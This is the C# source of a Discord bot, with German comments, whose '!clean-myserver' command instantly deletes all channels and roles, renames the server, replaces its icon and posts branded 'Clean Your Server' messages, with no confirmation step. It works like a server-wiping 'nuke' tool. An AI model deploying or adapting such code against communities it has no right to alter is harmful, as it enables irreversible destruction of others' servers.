using Discord;
using Discord.WebSocket;

class Program
{
    private static DiscordSocketClient _client = null!;
    private static byte[]? _logoBytes;

    static async Task Main()
    {
        var token = Environment.GetEnvironmentVariable("DISCORD_TOKEN");
        if (string.IsNullOrEmpty(token))
        {
            Console.Error.WriteLine("[FEHLER] DISCORD_TOKEN ist nicht gesetzt!");
            return;
        }

        if (File.Exists("/app/logo.jpg"))
        {
            _logoBytes = await File.ReadAllBytesAsync("/app/logo.jpg").ConfigureAwait(false);
            Console.WriteLine($"[OK] Logo vorgeladen ({_logoBytes.Length / 1024} KB).");
        }
        else
        {
            Console.WriteLine("[WARN] logo.jpg nicht gefunden – Logo-Änderung wird übersprungen.");
        }

        var config = new DiscordSocketConfig
        {
            GatewayIntents = GatewayIntents.Guilds
                           | GatewayIntents.GuildMessages
                           | GatewayIntents.MessageContent
        };

        _client = new DiscordSocketClient(config);

        _client.Log             += LogAsync;
        _client.Ready           += ReadyAsync;
        _client.MessageReceived += MessageHandler;

        await _client.LoginAsync(TokenType.Bot, token).ConfigureAwait(false);
        await _client.StartAsync().ConfigureAwait(false);
        await Task.Delay(-1).ConfigureAwait(false);
    }

    private static Task LogAsync(LogMessage log)
    {
        Console.WriteLine(log.ToString());
        return Task.CompletedTask;
    }

    private static Task ReadyAsync()
    {
        Console.WriteLine("[OK] Bot ist online – !clean-myserver bereit.");
        return Task.CompletedTask;
    }

    // ── !clean-myserver aufgerufen → sofort loslegen, keine Warnung ──────────
    private static async Task MessageHandler(SocketMessage message)
    {
        if (message is not SocketUserMessage userMsg) return;
        if (userMsg.Author.IsBot) return;
        if (userMsg.Channel is not SocketGuildChannel guildChannel) return;
        if (!userMsg.Content.Equals("!clean-myserver", StringComparison.OrdinalIgnoreCase)) return;

        var guildUser = guildChannel.Guild.GetUser(userMsg.Author.Id);
        if (!guildUser.GuildPermissions.Administrator)
        {
            await userMsg.Channel.SendMessageAsync(
                "❌ Du brauchst Administrator-Rechte für diesen Command."
            ).ConfigureAwait(false);
            return;
        }

        var guild = guildChannel.Guild;

        // Sofort-Meldung senden
        await userMsg.Channel.SendMessageAsync("🧹 Reinigung läuft...").ConfigureAwait(false);

        // ── ALLES GLEICHZEITIG STARTEN ────────────────────────────────────────

        var editTask = guild.ModifyAsync(p =>
        {
            p.Name = "SERVER GEREINIGT";            // ← Servername hier ändern
            if (_logoBytes is not null)
                p.Icon = new Image(new MemoryStream(_logoBytes));
        });

        var channelTasks = guild.Channels
            .Select(ch => ch.DeleteAsync())
            .ToList();

        var roleTasks = guild.Roles
            .Where(r => !r.IsEveryone && !r.IsManaged)
            .Select(r => r.DeleteAsync())
            .ToList();

        await Task.WhenAll(new[] { editTask }
            .Concat(channelTasks)
            .Concat(roleTasks))
            .ConfigureAwait(false);

        Console.WriteLine("[OK] Servername, Logo, Kanäle und Rollen fertig.");

        // ── 3 Info-Kanäle erstellen + Nachrichten senden ─────────────────────
        var newChannels = await Task.WhenAll(
            Enumerable.Range(0, 3)                                        // ← Kanal-Anzahl hier ändern
                .Select(_ => guild.CreateTextChannelAsync("information")) // ← Kanalname hier ändern
        ).ConfigureAwait(false);

        await Task.WhenAll(newChannels.Select(ch =>
            ch.SendMessageAsync(                                           // ← Nachricht pro Kanal
                "✅ **Server erfolgreich Gereinigt!**\n" +
                "> Alle Kanäle und Rollen wurden entfernt.\n" +
                "> Powered by **Clean Your Server**"
            )
        )).ConfigureAwait(false);

        Console.WriteLine("[OK] 3 #information Kanäle erstellt + Nachrichten gesendet.");
    }
}
